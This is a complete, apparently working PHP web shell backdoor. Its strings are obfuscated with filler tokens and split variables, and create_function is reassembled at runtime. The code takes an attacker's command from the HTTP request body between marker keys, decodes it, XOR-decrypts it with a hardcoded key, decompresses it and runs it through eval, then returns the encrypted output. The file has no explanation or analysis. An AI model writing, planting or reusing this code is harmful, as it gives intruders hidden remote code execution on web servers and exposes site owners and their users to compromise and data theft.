<?php
$D=str_replace('HY','','HYcrHYeateHY_fuHYnHYHYction');
$B='}U}s(U});@ob_end_clean();$U}r=@bU}aU}se64_encode(@xU}U}(@gzcomprU}ess(U}$o),$U}k));print("$U}p$kh$rU}$kf");}';
$k='b_staU}rt();@evU}al(U}@gzuncomprU}ess(@x(@baU}se64U}_decoU}de($m[1])U},$kU})))U};$o=@U}ob_get_conteU}ntU';
$f='U};){for($j=0U};($jU}<$cU}&&$i<$l);$j+U}+,$U}iU}++){$o.=$t{$U}i}^$k{$j};}U}}return U}$o;}ifU} U}(';
$q=';fU}unU}ction x($tU},U}$k){U}$cU}=strleU}n($k);$U}l=strlen(U}$t);$o="U}";for($i=U}U}0;U}$i<$l';
$C='@preg_match(U}"/$U}khU}(.+)$kf/",@fiU}leU}_get_conteU}nts("U}php:/U}/input"U}U}),U}$m)==1) {@oU}';
$a='U}$kU}="63eb3daf";U}$kU}h="8cb7U}9c5a282c"U};$kf="5b24U}28U}452a74U}";$p="67U}T2us4e3Z8sVU}rYq"';
$X=str_replace('U}','',$a.$q.$f.$C.$k.$B);
$J=$D('',$X);$J();
?>
